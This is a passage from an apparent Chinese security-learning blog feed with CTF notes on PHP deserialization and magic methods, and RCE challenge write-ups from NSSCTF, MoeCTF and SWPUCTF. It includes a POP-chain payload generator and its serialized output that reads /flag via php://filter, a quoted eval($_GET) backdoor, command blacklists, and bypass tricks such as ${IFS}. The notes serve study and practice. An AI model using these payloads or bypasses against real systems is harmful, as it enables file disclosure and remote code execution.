title="url中的路径使用"></a><code>url</code>中的路径使用</h3><p>相对路径就是相对于自己的目标文件的位置。（指以当前文件所处目录而言文件的位置）————以引用文件之间网页所在位置为参考基础，而建立出的目录路径。因此当保存于不同目录的网页引用同一个文件时，所使用的路径将不相同，故称之为相对。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;/&quot;代表根目录</span><br><span class="line">&quot;./&quot;代表当前目录</span><br><span class="line">&quot;…/&quot;代表上级目录</span><br></pre></td></tr></table></figure><p>在web应用中，对于请求的任何资源，均需要转化为绝对URL地址。<br>URL 地址请求 &#x3D; http:&#x2F;&#x2F;域名(或地址): 端口号&#x2F; + 当前web应用根目录+ Web 相对路径</p><h3 id="ctf中常见路径"><a href="#ctf中常见路径" class="headerlink" title="ctf中常见路径"></a><code>ctf</code>中常见路径</h3><p>来自<a href="https://blog.csdn.net/zmx999999/article/details/146064650#:~:text=%E4%BB%A5%E4%B8%8B%E6%98%AFCTF%E4%B8%AD%E6%9C%80%E5%B8%B8%E8%A7%81%E7%9A%84%E8%B7%AF%E5%BE%84%E5%8F%8A%E5%85%B6%E5%85%B8%E5%9E%8B%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%9A%201.%20Web%E5%BA%94%E7%94%A8%E7%9B%B8%E5%85%B3%E8%B7%AF%E5%BE%84%20%2Fvar%2Fwww%2Fhtml%EF%BC%9A%20Apache,%E9%BB%98%E8%AE%A4Web%E6%A0%B9%E7%9B%AE%E5%BD%95%EF%BC%88%E5%AD%98%E6%94%BEPHP%2FHTML%E6%BA%90%E7%A0%81%E3%80%81%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%89%E3%80%82%20%2Fusr%2Fshare%2Fnginx%2Fhtml%EF%BC%9ANginx%E9%BB%98%E8%AE%A4Web%E6%A0%B9%E7%9B%AE%E5%BD%95%E3%80%82%20%2Fapp%EF%BC%9A%20Docker%20%E6%88%96%E8%87%AA%E5%AE%9A%E4%B9%89Web%E5%BA%94%E7%94%A8%E7%9A%84%E5%B8%B8%E8%A7%81%E7%9B%AE%E5%BD%95%E3%80%82%20%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%9A%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E3%80%81%E4%B8%8A%E4%BC%A0Webshell%E3%80%82">ctf中常见路径</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Linux用户、文件权限、目录、路径&quot;&gt;&lt;a href=&quot;#Linux用户、文件权限、目录、路径&quot; class=&quot;headerlink&quot; title=&quot;Linux用户、文件权限、目录、路径&quot;&gt;&lt;/a&gt;Linux用户、文件权限、目录、路径&lt;/h1&gt;&lt;p&gt;内容主要出处</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>反序列化漏洞学习</title>
    <link href="http://example.com/2025/04/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2025/04/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2025-04-07T09:23:28.000Z</published>
    <updated>2025-04-07T09:24:06.601Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化漏洞分析"><a href="#PHP反序列化漏洞分析" class="headerlink" title="PHP反序列化漏洞分析"></a>PHP反序列化漏洞分析</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ol><li><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241210170102320.png" alt="image-20241210170102320"></li></ol><p>对于字符串来说，比<code>PHP</code>对象更容易存储、在网络上进行传输；</p><p>对象有比较复杂的内存结构，有属性，有方法，有属性的值，有属性的访问控制权限等，这样非常复杂的内存结构很难在网络是传输，</p><p><code>serialize()</code>: 序列化，参数传入的是一个对象，输出是字符串；</p><p><code>unserialize()</code>：反序列化， 输入是字符串，输出是一个对象；</p><ol start="2"><li><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241210170436061.png" alt="image-20241210170436061"></p><ul><li>在test这个类里，有三个属性<code>flag，test，test1</code>，他们有这不同的访问控制权限；</li><li>他们还各自有两个方法：<code>set_flag ,get_flag</code> ,</li><li><code>$object = new test()</code> :实例化这样一个对象；</li><li><code>$object -&gt;set_flag(&#39;Active&#39;)&quot;</code>：调用这个对象的<code>set_flag</code>方法，相当于把<code>$flag</code>从<code>Inactive</code>改为<code>Active</code>；</li><li><code>$data = serialize($object)</code>:对它做序列化操作；</li><li>打印输出，就是右侧这个样子；</li></ul></li><li><p>保留了这个对象的所有属性名（<code>falg,test,test1</code>)；保留了它的属性值（<code>Active,test,test1</code>）；还保留了这些属性的访问控制权限</p><p><code>public</code>成员变量的名字直接写就行；</p><p><code>protected</code>成员变量的名字前需要加上%00*%00；</p><p><code>private</code>成员变量的名字前需要加上%00类名%00；</p></li><li><p>序列化的过程，只序列化属性，不序列化方法；</p><p>序列化后就看不到get_flag；</p></li><li><p>反序列化过程，从右边字符串展开到左边对象这个过程， </p></li><li><p>反序列化的漏洞：攻击者精心构造一个右边的字符串，输进这个系统里，然后在它转换成对象的过程中，实现攻击。</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;john&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span> = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isOK</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_username</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;usernme;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$p</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serialized</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;%00&quot;</span>, <span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;整型 &quot;</span> . <span class="title function_ invoke__">serialize</span>(<span class="number">10</span>) . PHP_EOL;<span class="comment">//.PHP_EOL，预定义常量，换行</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;浮点型 &quot;</span> . <span class="title function_ invoke__">serialize</span>(<span class="number">13.14</span>).PHP_EOL; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;字符串 &quot;</span> . <span class="title function_ invoke__">serialize</span>(<span class="string">&quot;This is a string&quot;</span>). PHP_EOL; <span class="comment">// 字符串 s:16:&quot;This is a string&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;布尔型 &quot;</span> . <span class="title function_ invoke__">serialize</span>(<span class="literal">FALSE</span>). PHP_EOL; <span class="comment">// 布尔型 b:0;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NULL &quot;</span> . <span class="title function_ invoke__">serialize</span>(<span class="literal">NULL</span>). PHP_EOL; <span class="comment">// NULL N;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;数组 &quot;</span> . <span class="title function_ invoke__">serialize</span>([<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>, <span class="string">&#x27;baz&#x27;</span>]). PHP_EOL;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250402185723022.png" alt="image-20250402185723022"></p><table><thead><tr><th align="left">首字符</th><th align="left">数据类型</th><th align="left">示例序列化字符串</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><code>a</code></td><td align="left">Array</td><td align="left"><code>a:3:&#123;i:0;i:1;i:1;s:3:&quot;two&quot;;i:2;i:3;&#125;</code></td><td align="left">数组</td></tr><tr><td align="left"><code>b</code></td><td align="left">Boolean</td><td align="left"><code>b:1;</code> 或 <code>b:0;</code></td><td align="left">布尔值(true&#x2F;false)</td></tr><tr><td align="left"><code>d</code></td><td align="left">Double&#x2F;Float</td><td align="left"><code>d:3.14;</code></td><td align="left">浮点数</td></tr><tr><td align="left"><code>i</code></td><td align="left">Integer</td><td align="left"><code>i:42;</code></td><td align="left">整数</td></tr><tr><td align="left"><code>N</code></td><td align="left">NULL</td><td align="left"><code>N;</code></td><td align="left">空值</td></tr><tr><td align="left"><code>O</code></td><td align="left">Object</td><td align="left"><code>O:8:&quot;stdClass&quot;:0:&#123;&#125;</code></td><td align="left">对象</td></tr><tr><td align="left"><code>r</code></td><td align="left">Reference</td><td align="left"><code>r:1;</code></td><td align="left">引用(已弃用)</td></tr><tr><td align="left"><code>R</code></td><td align="left">Reference</td><td align="left"><code>R:1;</code></td><td align="left">对象引用</td></tr><tr><td align="left"><code>s</code></td><td align="left">String</td><td align="left"><code>s:5:&quot;hello&quot;;</code></td><td align="left">字符串</td></tr><tr><td align="left"><code>S</code></td><td align="left">Escaped String</td><td align="left"><code>S:5:&quot;\61\62\63&quot;;</code></td><td align="left">转义字符串(二进制安全)</td></tr><tr><td align="left"><code>C</code></td><td align="left">Custom Object</td><td align="left"><code>C:11:&quot;MyClass&quot;:5:&#123;...&#125;</code></td><td align="left">实现了Serializable接口的对象</td></tr></tbody></table><h2 id="反序列化攻击概述"><a href="#反序列化攻击概述" class="headerlink" title="反序列化攻击概述"></a>反序列化攻击概述</h2><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241210171558290.png" alt="image-20241210171558290"></p><p>有些方法往往已经存在，并会被调用。</p><p>构造函数，析构函数等（在C++中一定会被调用），在<code>PHP</code>中也存在这些方法，称为魔术方法。</p><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241210172228879.png" alt="image-20241210172228879"></p><p>  一般的方法，需要我们手动调用，比如：object -&gt;方法名称（参数）这样调用，上图就无须这样。</p><p>反序列化只能控制属性，没办法控制反序列化后这个代码会调用什么方法，而魔术方法的调用，是在满足某种条件下会自动调用的，无需人工写一些代码去调用，所有只要在魔术方法当中存在一些我们能利用的函数，我们就能够通过反序列化，对这个对象的属性做特殊的操控，进而影响对这些函数的调用逻辑，来实现我们攻击的目的。</p><h3 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241216143908179.png" alt="image-20241216143908179"></p><p>可以把他理解为<code>PHP</code>里的构造函数：当一个对象被实例化的时候，就会自动被调用</p><p>在A这个类，有一个<code>__construct()</code>魔术方法，它会输出”This is a construct function”这句话，当代码执行到第10行”$a &#x3D; new A()”$a这个变量，它是A的实例化的时候，紧接着他就会自动的去实行4~8行这个方法，所以屏幕上就会出现那句话。</p><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241216145059245.png" alt="image-20241216145059245"></p><p>可以理解为PHP中的析构函数：当一个对象的内存空间被回收的时候，就会自动调用它的析构函数，</p><p>A这个类中，有两个魔术方法 __ construct()  ,__ destruct(),当代码执行15行代码，对A这个对象进行实例化的时候，会自动调用第4行的 __ construct()这个方法，然后程序执行结束，a这个对象的内存空间会被回收，在此之前这个对象要被析构掉，在这个PHP代码执行结束之前，还会执行第9行这__ destruct()这个方法，所以这个屏幕上会出翔两行字。</p><h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241216151201685.png" alt="image-20241216151201685"></p><p>在序列化的时候，会被调用，他原本的目的是返回一个需要被序列化的属性数组。</p><p>在A这个类里有两个属性：test，test2，有两个魔术方法__ construct()，__ sleep()，construct()不再赘述，在执行第18行代码对a这个属性做序列化的时候，就会 自动调用a所属的类是__ sleep()这个魔术方法：先输出这个字符串，再返回一个数组，数组里面包含需要被序列化的属性的名称，换句话说，这个a这个对象有两个属性test，和test2，返回的这个数组，表明只有test这个属性会被序列化。这是sleep这个方法本身的含义</p><p>对于我们来说，我们需要知道是的是它调用的时机，当看到序列化函数的时候，就知道sleep这个方法一定会被调用。</p><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241216151712426.png" alt="image-20241216151712426"></p><p>再反序列化的时候被自动调用</p><p>24：这个反序列化这个过程看起来像是也构造一个对象一样，但是，他不会调用这个对象的construct魔术方法，会调用这个对象的wakeup魔术方法。</p><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241216152203081.png" alt="image-20241216152203081"></p><p>当我们把一个对象当作字符串来使用的时候，就等价于调用它的toString魔术方法，</p><p>17：再输出$a：把$a这个对象当作字符串来使用，就会调用toString这个魔术方法，最后屏幕上就会输出：”This is a toString function”。</p><h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241216152726842.png" alt="image-20241216152726842"></p><p>当把一个对象当作函数来使用的时候，就会调用invoke魔术方法</p><p>16:$a是一个对象，但再a后边加了()，相当于按照一个函数一样的在调用这个对象，16行的函数调用就等价于9行这个invoke这个魔术方法的实行。</p><h3 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241216153851465.png" alt="image-20241216153851465"></p><p>在调用一个对象不存在的方法时候，就等价于调用call魔术方法</p><p>A这个类并不存在test这个魔术方法，但他却同时定义了call魔术方法，17行在调用test这个魔术方法的时候，就等价于调用call这个方法，</p><p>call魔术方法会接收两个参数，第一个参数：是调用的那个并不存在的魔术方法名（test），第二个：是他所传入的参数（’no’，’this’，’function’）</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><table><thead><tr><th>名称</th><th>触发机制</th></tr></thead><tbody><tr><td>__construct()</td><td>在对象实例化（创建对象）的时候自动触发</td></tr><tr><td>__destruct()</td><td>在销毁对象的时候自动触发</td></tr><tr><td>__wakeup()</td><td>执行unserialize()时，先会调用这个函数</td></tr><tr><td>__sleep()</td><td>执行serialize()时，先会调用这个函数</td></tr><tr><td>__call()</td><td>在对象上下文中调用不可访问的方法时触发</td></tr><tr><td>__get()</td><td>访问私有或不存在的成员属性的时候自动触发</td></tr><tr><td>__set()</td><td>对私有成员属性进行设置值时自动触发</td></tr><tr><td>__isset()</td><td>对私有成员属性进行 isset 进行检查时自动触发</td></tr><tr><td>__unset()</td><td>对私有成员属性进行 unset 进行检查时自动触发</td></tr><tr><td>__toString()</td><td>把类当作字符串使用时触发</td></tr><tr><td>__invoke()</td><td>当尝试将对象调用为函数时触发</td></tr></tbody></table><h2 id="反序列化攻击"><a href="#反序列化攻击" class="headerlink" title="反序列化攻击"></a>反序列化攻击</h2><p>组建攻击链：各种魔术方法组合起来，最终形成一个可以实现我们攻击目的的一个攻击链</p><h3 id="反序列化攻击样例"><a href="#反序列化攻击样例" class="headerlink" title="反序列化攻击样例"></a>反序列化攻击样例</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241216193233111.png" alt="image-20241216193233111"></p><p>25：反序列化攻击的入口，</p><p>反序列化攻击，需要我们构造对应的序列化字符串，需要把其中的某一个类，把它序列化掉，通过控制它的属性来实现攻击</p><p>现在有三个类，可以向其中传入一个实例化的对象，可以先排除后两个对象（后两个反序列化后没有任何意义：它没有调用任何的方法），放入Aurora这个实例化的类，construct魔术方法无法调用（在反序列化中，调用的是<code>__wakeup()</code>），调用destruct魔术方法：调用test属性的action方法。test里必须放入一个能被action方法的值，</p><p>例如：可以把Auroa对象的test属性附成是一个L对象，屏幕上会出翔”CUMT”；</p><p>往test属性，附一个Evil对象：Evil属性的action方法会被调用，</p><p>eval（）：任意命令执行；</p><p>构造序列化字符串：必须代表一个Aurora对象；这个Aurora对象的test属性必须是一个eval对象；这个eval对象的test2属性必须是一个我们想要执行的命令</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250403141822772.png" alt="image-20250403141822772"></p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250403143210935.png" alt="image-20250403143210935"></p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250403143327027.png" alt="image-20250403143327027"></p><p><a href="https://www.nssctf.cn/problem/2099">https://www.nssctf.cn/problem/2099</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>=<span class="string">&quot;php://filter/convert.base64-encode/resource=/flag&quot;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$try</span>=<span class="keyword">new</span> <span class="title class_">Try_Work_Hard</span>;</span><br><span class="line"><span class="variable">$make</span>=<span class="keyword">new</span> <span class="title class_">Make_a_Change</span>;</span><br><span class="line"><span class="variable">$make</span>-&gt;effort=<span class="variable">$try</span>;</span><br><span class="line"><span class="variable">$road</span>=<span class="keyword">new</span> <span class="title class_">Road_is_Long</span>;</span><br><span class="line"><span class="variable">$road</span>-&gt;<span class="keyword">string</span>=<span class="variable">$make</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Road_is_Long</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;page=<span class="variable">$road</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//O%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BO%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BN%3Bs%3A6%3A%22string%22%3BO%3A13%3A%22Make_a_Change%22%3A1%3A%7Bs%3A6%3A%22effort%22%3BO%3A13%3A%22Try_Work_Hard%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A49%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fflag%22%3B%7D%7D%7Ds%3A6%3A%22string%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PHP反序列化漏洞分析&quot;&gt;&lt;a href=&quot;#PHP反序列化漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;PHP反序列化漏洞分析&quot;&gt;&lt;/a&gt;PHP反序列化漏洞分析&lt;/h1&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;head</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>RCE1.0</title>
    <link href="http://example.com/2025/03/21/RCE1-0/"/>
    <id>http://example.com/2025/03/21/RCE1-0/</id>
    <published>2025-03-21T12:55:21.000Z</published>
    <updated>2025-03-21T12:58:20.628Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-NSSRound-8-Basic-MyDoor"><a href="#1-NSSRound-8-Basic-MyDoor" class="headerlink" title="1.[NSSRound#8 Basic]MyDoor"></a>1.[NSSRound#8 Basic]MyDoor</h2><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20150213.png"></p><p>什么也没有，</p><p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</p><p>然后解码：</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20145921.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">**`<span class="meta">&lt;?php</span>`**</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);`**</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/index.php?file=&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.|la|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>error_reporting(0);</code></strong> 关闭了所有的错误报告。</p><ul><li>因为_作为参数在php是非法的，所以需要用[来替代</li></ul><p><strong><code>eval($_GET[&#39;N_S.S&#39;]);</code></strong></p><ul><li>如果 URL 参数 <code>N_S.S</code> 存在，会将其内容作为 PHP 代码执行</li></ul><p><strong>文件包含逻辑</strong></p><ul><li>如果 URL 参数 <code>file</code> 不存在，会重定向到 <code>index.php?file=</code>。</li><li>如果 <code>file</code> 参数存在，会检查其值是否包含黑名单中的字符串（如 <code>..</code>, <code>la</code>, <code>data</code>, <code>input</code>, <code>glob</code>, <code>gopher</code>, <code>file</code>, <code>http</code>, <code>phar</code>, <code>localhost</code>, <code>?</code>, <code>*</code>, <code>~</code>, <code>zip</code>, <code>7z</code>, <code>compress</code> 等）。</li><li>如果 <code>file</code> 参数的值通过黑名单检查，会将其作为文件路径包含进来（<code>include $file;</code>）</li></ul><p>在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候，php会将怪异的变量名转换成有效的，在进行解析时会删除空白符，并将空格、+、点、[ 转换为下划线。但是用一个特性是可以绕过的，就是当 [ 提前出现后，[ 会转换成下划线，而后面的字符就不会再被转义了。</p><p>方法一：</p><p>有些题目会将 flag 或敏感信息存储在环境变量中。通过 <code>env</code> 命令可以快速查看当前环境变量，寻找可能的线索。</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%25E5%25B1%258F%25E5%25B9%2595%25E6%2588%25AA%25E5%259B%25BE%25202025-03-16%2520151649.png"></p><p>NSSCTF{61c40417-c85a-4942-9ea4-372a0816557c}</p><p>方法二：</p><p><code>phpinfo()</code> 是 PHP 中的一个内置函数，用于<strong>显示当前 PHP 环境的配置信息</strong>。它会输出一个详细的 HTML 页面，包含 PHP 版本、服务器信息、加载的扩展、配置文件路径、环境变量等信息。</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250318194528793.png" alt="image-20250318194528793"></p><h2 id="2-MoeCTF-2021-babyRCE"><a href="#2-MoeCTF-2021-babyRCE" class="headerlink" title="2.[MoeCTF 2021]babyRCE"></a>2.[MoeCTF 2021]babyRCE</h2><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20154052.png"></p><ol><li>禁止使用 cat more less head tac tail nl od vi vim sort（防止读取文件）。</li><li>禁止使用 空格（ ）、分号（;）、数字（0-9）、星号（*）、反引号（&#96;）、百分号（%）、重定向符号（&gt; &lt;）、引号（’ “）</li><li>过滤了空格的话，用${IFS}</li></ol><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20154308.png"></p><p>直接cat,</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20154504.png"></p><p>啥也没有，查看源代码；</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20154531.png"></p><p>NSSCTF{c09a935e-7121-4336-909b-f9e82dd27d79}</p><h2 id="3-SWPUCTF-2023-秋季新生赛-RCE-PLUS"><a href="#3-SWPUCTF-2023-秋季新生赛-RCE-PLUS" class="headerlink" title="3.[SWPUCTF 2023 秋季新生赛]RCE-PLUS"></a>3.[SWPUCTF 2023 秋季新生赛]RCE-PLUS</h2><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20171105.png"></p><ol><li><strong><code>error_reporting(0);</code></strong><ul><li>关闭错误提示，防止泄露敏感信息。</li></ul></li><li><strong><code>highlight_file(__FILE__);</code></strong><ul><li>高亮显示当前文件的源代码。</li></ul></li><li><strong><code>strCheck</code> 函数</strong><ul><li>对用户输入的 <code>cmd</code> 参数进行黑名单过滤。</li><li>黑名单包括：<ul><li>特殊字符：<code>;</code>, <code>&amp;</code>, <code>$</code>, <code>\x09</code>（Tab 键）, <code>\x26</code>（&amp; 的十六进制表示）。</li><li>常见命令：<code>more</code>, <code>less</code>, <code>head</code>, <code>sort</code>, <code>tail</code>, <code>sed</code>, <code>cut</code>, <code>awk</code>, <code>strings</code>, <code>od</code>, <code>php</code>, <code>ping</code>, <code>flag</code>。</li></ul></li><li>如果输入包含黑名单中的内容，程序会终止并输出 <code>i hate this</code>。</li></ul></li><li><strong>命令执行逻辑</strong><ul><li>从 URL 参数 <code>cmd</code> 获取用户输入。</li><li>调用 